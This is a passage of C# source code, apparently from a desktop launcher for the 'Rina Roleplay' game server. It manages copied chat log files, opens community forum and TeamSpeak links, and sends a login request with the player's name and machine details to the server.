                    DirectoryInfo dir = new DirectoryInfo(rinalogsPath);
                    FileInfo path = dir.EnumerateFiles().OrderBy(x => x.CreationTime).FirstOrDefault();

                    if (path != null)
                    {
                        File.Delete(path.FullName);
                        refresh = 1;
                    }
                }

                if (Globals.ActiveChatLogs == 1)
                {

                    if (File.Exists(sampLogPath + @"\chatlog.txt") && Directory.Exists(rinalogsPath))
                    {
                        string newpath = rinalogsPath + @"\" + DateTime.Now.ToString("yyyy-M-dd-HH-mm-ss") + ".log";

                        if (!File.Exists(newpath))
                        {
                            long oldfilelong = GetLastChatLogLength();
                            long newfilelog = new System.IO.FileInfo(sampLogPath + @"\chatlog.txt").Length;

                            if (oldfilelong == -1 || oldfilelong != newfilelog)
                            {
                                File.Copy(sampLogPath + @"\chatlog.txt", newpath);
                                refresh = 1;
                            }
                        }
                    }
                }

                if (refresh == 1)
                    RefreshChatlogs();
            }
            catch { }
        }

        private void metroTabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            SunucuDurumuYenile();
        }

        private void websitegit_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/");
        }

        private void yenisikayet_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/sikayet/ekle");
        }

        private void metroButton5_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/index.php?action=helpdesk;sa=newticket");
        }

        private void metroButton6_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/indir");

        }

        private void metroButton7_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/indir");

        }

        private void metroButton8_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/index.php?board=169.0");

        }

        private void metroButton9_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/yetkililer");

        }

        private void metroButton10_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/helperler");

        }

        private void metroButton11_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/index.php?board=43.0");

        }

        private void metroButton12_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/index.php?board=57.0");

        }

        private void metroButton13_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/index.php?board=44.0");

        }

        private void metroButton14_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/forum/index.php?board=36.0");

        }

        private void metroTabPage2_Click(object sender, EventArgs e)
        {

        }

        private void duyuru_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start(duyuru_link);
        }

        private void duyuru_alt_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start(duyuru_link);
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {

        }

        private void oyunkontrol_Tick(object sender, EventArgs e)
        {

        }

        private void metroButton15_Click(object sender, EventArgs e)
        {
            this.listBox1.Items.Clear();
            Functions.PutDebugText("Liste temizlendi.");
        }

        private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (Globals.Client.metroCheckBox1.Checked)
            {
                Functions.SetDiscordHide(1);
            }
            else
            {
                Functions.SetDiscordHide(0);
            }

            RPCGuncelle();
        }

        private void metroButton16_Click(object sender, EventArgs e)
        {
            RefreshChatlogs();
            MessageBoxWrapper.Show("Liste yenilendi.", "Rina Roleplay");
        }

        private void metroButton18_Click(object sender, EventArgs e)
        {
            var documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var subFolderPath = Path.Combine(documentsPath, @"Rina Roleplay\chatlogs");

            if (Directory.Exists(subFolderPath))
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
                {
                    FileName = subFolderPath,
                    UseShellExecute = true,
                    Verb = "open"
                });
            }
        }

        private void metroButton17_Click(object sender, EventArgs e)
        {
            var documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var subFolderPath = Path.Combine(documentsPath, @"Rina Roleplay\chatlogs");

            int count = 0;
            if (Directory.Exists(subFolderPath))
            {
                foreach (string path in Directory.EnumerateFiles(subFolderPath))
                {
                    string extension = Path.GetExtension(path);

                    if (extension == ".log")
                    {
                        count++;
                        File.Delete(path);
                        listBox2.Items.Clear();
                    }
                }
            }

            if (count == 0)
                MessageBoxWrapper.Show("Temizlenecek kayıt bulunamadı.", "Rina Roleplay");
            else
                MessageBoxWrapper.Show("Kayıtlar temizlendi.", "Rina Roleplay");
        }

        private void metroCheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (Globals.Client.metroCheckBox2.Checked)
            {
                Functions.SetChatLogStatus(1);
            }
            else
            {
                Functions.SetChatLogStatus(0);
            }
        }

        private void listBox2_DoubleClick(object sender, EventArgs e)
        {
            string filename = listBox1.GetItemText(listBox2.SelectedItem);

            if (filename == null)
                return;

            var path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var chatlogsFolder = Path.Combine(path, @"Rina Roleplay\chatlogs\") + filename;

            if (File.Exists(chatlogsFolder))
            {
                Process.Start("notepad.exe", chatlogsFolder);
            }
        }

        private void backgroundWorker2_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {

        }

        private void pictureBox8_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/teamspeak");
        }

        private int GirisEkle()
        {
            try
            {
                string str = string.Concat(new string[]
                {
                    Functions.GetIPAddress(),
                    "|",
                    this.textBox1.Text.Trim(),
                    "|",
                    Globals.RegID,
                    "|",
                    Functions.GetComputerName(),
                    "|",
                    Functions.GetOsName()
                });

                string text = Functions.ReadTextFromUrl("http://" + Globals.RemoteClientSettings["webserverip"] + "/data/r_login.php?identity=" + str);
                if (text.Equals("failednetwork"))
                {
                    return -2;
                }
                if (text.Equals("ignoredname"))
                {
                    return -1;
                }
                if (text.Equals("failed"))
                {
                    return 0;
                }
                Globals.LoginKey = text.Split(new char[]
                {
                    '|'
                })[0];

                Globals.AliveUpdateCount = 0;
                Globals.GameStartedByUser = true;

                this.UpKey();
            }
            catch (Exception ex)
            {
                string str2 = "Giriş sırasında hata: ";
                Exception ex2 = ex;
                MessageBoxWrapper.Show(str2 + ((ex2 != null) ? ex2.ToString() : null), "Hata");
            }
            return 1;
        }

        private void timer3_Tick(object sender, EventArgs e)
        {

        }
    }
}

